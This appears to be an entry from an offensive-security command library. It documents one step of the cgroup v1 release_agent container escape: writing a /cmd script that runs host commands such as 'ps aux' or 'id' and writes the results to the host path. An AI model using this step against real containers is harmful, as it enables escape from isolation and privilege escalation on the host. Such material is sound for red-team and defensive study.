---
id: 303ac77d-c16b-4178-b48c-1fe161e848cb
name: create-release-agent-script
type: command
executor: bash
data: |-
  echo '#!/bin/sh' > /cmd
  echo "ps aux > $host_path/output" >> /cmd
output: null
created_at: '2023-04-06T03:56:17.110299+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - script
  - cgroup
verified: true
validated: true
---

# create-release-agent-script

## Command

```bash
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
```

## Description

Creates a basic shell script at /cmd to execute host commands (e.g., process dump) when triggered as the cgroup release agent.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| echo '#!/bin/sh' > /cmd | Shebang line | Yes |
| echo "ps aux > $host_path/output" >> /cmd | Command to append (customize as needed) | Yes |

## Examples

### Basic Usage

```bash
echo '#!/bin/sh' > /cmd
echo "id > $host_path/output" >> /cmd
```

## Expected Output

(No output; check with cat /cmd to see script content.)

## Related

- [[procedures/Abuse-Linux-Cgroup-v1-with-CAP-SYS-ADMIN-for-Host-Privilege-Escalation]]
